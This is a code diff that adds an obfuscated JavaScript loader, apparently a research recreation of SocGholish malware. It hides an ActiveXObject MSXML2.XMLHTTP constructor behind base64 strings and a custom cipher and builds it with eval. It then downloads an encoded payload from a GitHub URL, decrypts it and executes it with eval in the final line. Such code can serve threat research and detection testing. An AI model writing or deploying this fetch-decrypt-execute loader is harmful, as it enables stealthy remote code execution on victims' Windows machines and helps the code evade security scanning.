@@ -51,3 +51,46 @@ function decrypt(inputStr, cycles) {
     return result;
 }
 
+var mapping = {
+    _0x1111:"UXNkeWZ1SA==", // ActiveX
+    _0x2222:"X3J6dXNkODI=", // Object("
+    _0x3333:"XUNIXVwiPkg=", // MSXML2.X
+    _0x4444:"XVxYRERAMjk=", // MLHTTP")
+    _0x5555:"fnVnMA=="      // new 
+}
+
+// Create an instance of the MSXML2.XMLHTTP object
+// var XmlHttp_Object = new ActiveXObject("MSXML2.XMLHTTP");
+var _a0x7821 = decrypt(decode(mapping._0x1111), 4) + decrypt(decode(mapping._0x2222), 4)
++ decrypt(decode(mapping._0x3333), 4) + decrypt(decode(mapping._0x4444), 4);
+var _a0x2346 = decrypt(decode(mapping._0x5555), 4) + _a0x7821; 
+
+
+var XmlHttp_Object = eval(_a0x2346);
+
+// URL of the JavaScript file on GitHub
+var githubFileUrl = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/encoded-payload.txt";
+
+// Open a GET request
+XmlHttp_Object.open("GET", githubFileUrl, false); // 'false' for synchronous request
+
+// Send the request
+XmlHttp_Object.send();
+
+if (XmlHttp_Object.status === 200) {
+    // Successfully retrieved the file
+    var fileContent = XmlHttp_Object.responseText;
+    // WScript.Echo("File content:\n" + fileContent);
+
+    // Optional: If you want to execute the fetched JavaScript content
+    // Be cautious with using eval, especially with content fetched from the internet
+    // eval(fileContent);
+} else {
+    // Handle errors, e.g., file not found or network issues
+    console.error("Error fetching file: HTTP status " + XmlHttp_Object.status);
+}
+
+var payload = decrypt(decode(fileContent), 4);
+// WScript.Echo(fileContent);
+// WScript.Echo(payload);
+this[eval(payload)];
